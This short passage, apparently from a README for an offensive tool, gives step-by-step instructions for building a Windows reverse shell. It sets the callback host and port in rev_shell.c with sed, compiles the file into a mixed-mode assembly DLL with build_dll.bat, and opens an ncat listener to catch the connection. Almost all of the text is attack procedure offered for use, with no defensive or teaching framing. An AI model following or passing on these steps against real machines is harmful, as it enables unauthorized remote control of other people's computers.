Windows C shell


Modify rev_shell.c with the hostname and port of the server where you'll be listening for a callback:
sed -i 's/<HOST>/<HOST>/; s/<PORT>/<PORT>/' rev_shell.c

Using the same method of compiling and linking described above, generate your mixed mode assembly DLL:
build_dll.bat rev_shell.c

Open a Netcat listener to catch the callback:
sudo ncat -lvp <PORT>
